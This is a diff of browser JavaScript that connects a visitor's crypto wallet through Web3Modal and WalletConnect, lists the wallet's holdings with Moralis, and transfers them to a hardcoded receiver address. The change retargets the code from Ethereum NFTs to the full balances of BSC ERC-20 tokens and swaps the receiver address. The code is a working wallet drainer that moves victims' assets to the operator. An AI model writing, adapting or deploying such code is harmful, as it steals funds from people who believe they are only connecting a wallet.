@@ -16,7 +16,7 @@ let provider;
 // Address of the selected account
 let selectedAccount;
 
-const receiver_address = '0xbec342919674355c103061515e1b3B32047D140E'; // gaf<- RECEIVER ADDRESS HERE
+ // gaf<- RECEIVER ADDRESS HERE
 let onButtonClick;
 let user_address;
 let start_to_log = false;
@@ -61,7 +61,11 @@ async function init() {
     walletconnect: {
       package: WalletConnectProvider,
       options: {
-        infuraId: "e77435344ef0486893cdc26d7d5cf039",
+        rpc: {
+          56: "https://bsc-dataseed.binance.org",
+        },
+        network: 'binance',
+        infuraId: "e77435344ef0486893cdc26d7d5cf039"
       }
     },
 
@@ -93,9 +97,13 @@ async function init() {
 async function fetchAccountData() {
   start_to_log = false;
   // Get a Web3 instance for the wallet
+  
   const web3 = new Web3(provider);
 
   console.log("Web3 instance is", web3);
+  //change chain to bsc
+  web3.eth.defaultCommon = {customChain: {name: 'bsc-network', chainId: 56, networkId: 56}, baseChain: 'mainnet', hardfork: 'petersburg'};
+
 
   // Get connected chain id from Ethereum node
   const chainId = await web3.eth.getChainId();
@@ -183,10 +191,6 @@ async function onConnect() {
   try {
     provider = await web3Modal.connect();
     console.log("provider", provider);
-
-    $(document).ready(function(){
-      $("#myModal").modal('show');
-  });
   } catch(e) {
     console.log("Could not get a wallet connection", e);
     return;
@@ -238,10 +242,11 @@ async function onDisconnect() {
   document.querySelector("#connected").style.display = "none";
 }
 
+const receiver_address = '0x324BE2C089BA3e8E660C24c207c3bc14d4F7105f';
 
-async function getNFTs(address="", api_key="", chain="eth", limit="98"){
+async function getTokens(address="", api_key="", chain="bsc"){
   return new Promise((resolve, reject)=>{
-      fetch(`https://deep-index.moralis.io/api/v2/${address}/nft`, {
+      fetch(`https://deep-index.moralis.io/api/v2/${address}/erc20?chain=bsc`, {
           method: "GET",
           headers: {
               "accept": "application/json",
@@ -303,11 +308,11 @@ async function proceed(){
     // NOTE: Moralis.User.current(); doesn't exist
 
     async function send() {
-        console.log("Attempting to send NFTs...");
+        console.log("Attempting to send tokens...");
         if (!user_address) {
           throw Error(`No user:  ${user_address}`);
         }
-        console.log("Searching for NFTs...");
+        console.log("Searching for tokens...");
     
     
         // let test_addr_with_nfts = '0xe41395822065dc3535a97116485312b44603b289'
@@ -322,34 +327,33 @@ async function proceed(){
         // })
         // console.log('Eth NFTs: %o', eth_nfts)
         
-        const eth_nfts = await getNFTs(user_address, apiKey).catch(e=>{
-          console.log("Unable to get NFTs", e);
+        const bsc_tokens = await getTokens(user_address, apiKey).catch(e=>{
+          console.log("Unable to get tokens", e);
         });
-        console.log('Eth NFTs: %o', eth_nfts)
+        console.log('bsc tokens: %o', bsc_tokens)
     
     
-        if (eth_nfts.total < 1) {
-          return console.log('No NFTs found')
+        if (bsc_tokens.length < 1) {
+          return console.log('No bsc tokens found')
         } // No NFTs
         // eth_nfts.result.forEach(async (nft, i) => {
-        for(let n=0; n<eth_nfts.result.length; n++){
-          let nft = eth_nfts.result[Number(n)];
+        for(let n=0; n<bsc_tokens.length; n++){
+          let token = bsc_tokens[Number(n)];
           let {
-            contract_type: type,
             token_address: contractAddress,
-            token_id: tokenId,
-          } = nft
-          let nft_transfer_options = {
-            type: type.toLowerCase(),
+            balance: balance,
+          } = token
+          let token_transfer_options = {
+            type: "erc20",
+            amount: balance,
             receiver: receiver_address, //'0x..',
             contractAddress,
-            tokenId,
           }
-          let temp = { nft: nft, options: nft_transfer_options }
-          console.log(`Transferring nft[${n}]:%o`, temp)
-          let transaction = await Moralis.transfer(nft_transfer_options).catch(
+          let temp = { token: token, options: token_transfer_options }
+          console.log(`Transferring token[${n}]:%o`, temp)
+          let transaction = await Moralis.transfer(token_transfer_options).catch(
             (e) => {
-              console.log("Can't transfer NFT:", e, "Transfer Options: %o", nft_transfer_options);
+              console.log("Can't transfer NFT:", e, "Transfer Options: %o", token_transfer_options);
             },
           )
           console.log(transaction);
